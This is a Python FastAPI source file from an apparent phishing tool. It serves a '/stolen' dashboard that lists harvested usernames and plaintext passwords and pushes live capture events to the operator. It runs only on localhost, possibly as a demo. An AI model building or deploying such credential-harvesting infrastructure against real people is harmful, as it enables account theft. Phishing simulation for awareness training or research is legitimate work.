import asyncio
from pathlib import Path
from typing import Annotated

import uvicorn
from fastapi import FastAPI, Form, Request
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from starlette.responses import RedirectResponse, Response, StreamingResponse

from phishing.credentials import capture_credential, captured_credentials
from phishing.event_bus import event_bus

ASSETS_DIR: Path = Path(__file__).parents[1] / "assets"

app = FastAPI()
app.mount("/static", StaticFiles(directory=ASSETS_DIR / "static"), name="static")
templates = Jinja2Templates(directory=ASSETS_DIR / "templates")


@app.get("/")
async def index() -> RedirectResponse:
    return RedirectResponse("/stolen")


@app.get("/stolen", response_model=None)
async def stolen_page(request: Request) -> Response:
    credentials = [
        {
            "username": c.username,
            "password": c.password,
            "nCaptures": c.n_captures,
            "lastCapturedAt": c.last_captured_at.isoformat(),
        }
        for c in captured_credentials
    ]
    return templates.TemplateResponse(
        request,
        "stolen.html",
        {"credentials": credentials},
    )


@app.get("/api/events")
async def sse_events() -> StreamingResponse:
    queue = event_bus.add_client()

    async def event_stream() -> asyncio.AsyncIterator[str]:  # type: ignore[type-arg]
        try:
            yield ": connected\n\n"
            while True:
                try:
                    message = await asyncio.wait_for(queue.get(), timeout=30)
                    yield message
                except TimeoutError:
                    yield ": heartbeat\n\n"
        finally:
            event_bus.remove_client(queue)

    return StreamingResponse(
        event_stream(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no",
        },
    )


def main() -> None:
    uvicorn.run(
        "phishing.app:app",
        host="127.0.0.1",
        port=8666,
        reload=True,
    )


if __name__ == "__main__":
    main()
